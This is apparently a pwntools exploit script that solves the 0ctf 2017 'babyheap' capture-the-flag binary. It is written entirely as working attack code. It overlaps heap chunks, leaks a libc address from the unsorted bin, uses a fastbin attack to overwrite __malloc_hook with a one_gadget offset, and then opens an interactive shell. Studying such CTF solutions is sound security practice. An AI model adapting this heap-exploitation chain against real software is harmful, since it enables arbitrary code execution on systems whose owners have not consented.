from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_07_0ctf_2017_babyheap')
elf = ELF('./data/bin/heap23_07_0ctf_2017_babyheap')
libc = elf.libc

def alloc(size):
    p.recvuntil(b'Command: ')
    p.sendline(b'1')
    p.sendline(str(size).encode())

def fill(idx,payload):
    p.recvuntil(b'Command: ')
    p.sendline(b'2') 
    p.sendline(str(idx).encode())
    p.sendline(str(len(payload)).encode())
    p.send(payload)

def free(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'3')
    p.sendline(str(idx).encode())

def dump(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'4')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Content: \n')

alloc(0x10);alloc(0x10);alloc(0x30);alloc(0x40);alloc(0x60)#step.1
fill(0,p64(0x51)*4);fill(2,p64(0x31)*6)#step.2
free(1) #step.3
alloc(0x40)#step.4
fill(1,p64(0x91)*4)#step.5
free(2)#step.6
dump(1);p.recv(0x20);SBaddr = u64(p.recv(8));p.recvline();malloc_hook=SBaddr-88-0x10#step.7
free(4)#step.8
payload=p64(0)*9+p64(0x71)+p64(malloc_hook-0x23);fill(3,payload)#step.9
alloc(0x60);alloc(0x60)#step.10
libc_addr = malloc_hook-libc.symbols['__malloc_hook'];payload=p64(libc_addr+0x4527a);shllcode=b'a'*0x13+payload;fill(4,shllcode)#step.11
alloc(1);p.sendline(b'bash')#step.12
p.interactive()#step.13